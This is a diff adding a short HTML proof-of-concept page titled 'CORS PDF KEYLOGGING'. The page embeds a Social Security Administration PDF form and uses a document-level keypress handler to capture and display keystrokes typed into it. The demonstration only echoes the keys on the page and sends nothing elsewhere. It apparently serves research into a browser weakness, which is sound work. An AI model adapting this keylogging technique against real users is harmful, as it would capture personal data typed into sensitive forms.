@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS PDF KEYLOGGING</title>
+</head>
+<body>
+<div id='keyslogged'>
+    Start typing in the PDF form.
+    <br></br>
+    Keys logged:
+</div>
+<script type="text/javascript">
+    document.onkeypress = function (evt) {
+        evt = evt || window.event
+        key = String.fromCharCode(evt.charCode)
+        if (key) {
+            var div = document.getElementById('keyslogged');
+            div.innerHTML = div.innerHTML + key;
+        }
+    }
+</script>
+
+<br><br>
+<object data="https://www.socialsecurity.gov/forms/ssa-88.pdf" type="application/pdf" width="100%"
+        height="800px">
+    <p>It appears you don't have a PDF plugin for this browser.</p>
+</object>
+</body>
+</html>
